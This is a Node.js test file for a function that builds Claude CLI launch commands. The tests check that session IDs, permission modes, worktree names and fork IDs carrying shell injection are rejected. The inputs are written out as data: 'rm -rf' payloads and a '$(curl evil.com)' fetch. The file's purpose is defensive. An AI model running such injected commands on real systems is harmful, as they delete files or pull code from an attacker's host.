const test = require('node:test');
const assert = require('node:assert/strict');
const { buildClaudeCmd, shq } = require('../claude-cmd');

const UID = '12345678-aaaa-bbbb-cccc-1234567890ab';

test('rejects non-UUID sessionId', () => {
  const r = buildClaudeCmd({ sessionId: 'bogus; rm -rf ~', isNew: true });
  assert.equal(r.ok, false);
});

test('builds minimal new-session command', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true });
  assert.equal(r.ok, true);
  assert.equal(r.cmd, `claude --session-id '${UID}'`);
});

test('builds resume command', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: false });
  assert.equal(r.ok, true);
  assert.equal(r.cmd, `claude --resume '${UID}'`);
});

test('rejects unknown permissionMode', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { permissionMode: '; rm -rf /' } });
  assert.equal(r.ok, false);
});

test('accepts known permissionMode', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { permissionMode: 'plan' } });
  assert.equal(r.ok, true);
  assert.match(r.cmd, /--permission-mode 'plan'/);
});

test('rejects worktreeName with metacharacters', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: true, sessionOptions: { worktree: true, worktreeName: '$(rm -rf ~)' } });
  assert.equal(r.ok, false);
});

test('rejects forkFrom that is not a UUID-ish string', () => {
  const r = buildClaudeCmd({ sessionId: UID, isNew: false, sessionOptions: { forkFrom: "$(curl evil.com)" } });
  assert.equal(r.ok, false);
});

test('escapes single quotes inside validated values', () => {
  // permissionMode is whitelisted, so attempt via... actually we can only test
  // the escape function directly since all validated fields reject quotes.
  assert.equal(shq("it's"), `'it'\\''s'`);
});

test('addDirs produces two --add-dir args, each single-quoted', () => {
  const r = buildClaudeCmd({
    sessionId: UID,
    isNew: true,
    sessionOptions: { addDirs: '/tmp/with space,/tmp/ok' },
  });
  assert.equal(r.ok, true);
  // Two --add-dir occurrences, each followed by a single-quoted absolute path.
  const matches = r.cmd.match(/--add-dir '[^']+'/g) || [];
  assert.equal(matches.length, 2);
});

test('appendSystemPrompt substitutes a cat expression over the temp path', () => {
  const r = buildClaudeCmd({
    sessionId: UID,
    isNew: true,
    sessionOptions: { appendSystemPrompt: 'hello' },
    tmpPromptPath: '/tmp/switchboard-prompt-abc.md',
  });
  assert.equal(r.ok, true);
  assert.match(r.cmd, /--append-system-prompt "\$\(cat '\/tmp\/switchboard-prompt-abc\.md'\)"/);
});

test('preLaunchCmd is prepended as-is (documented behavior)', () => {
  const r = buildClaudeCmd({
    sessionId: UID,
    isNew: true,
    sessionOptions: { preLaunchCmd: 'export FOO=bar &&' },
  });
  assert.equal(r.ok, true);
  assert.ok(r.cmd.startsWith('export FOO=bar && claude'));
});
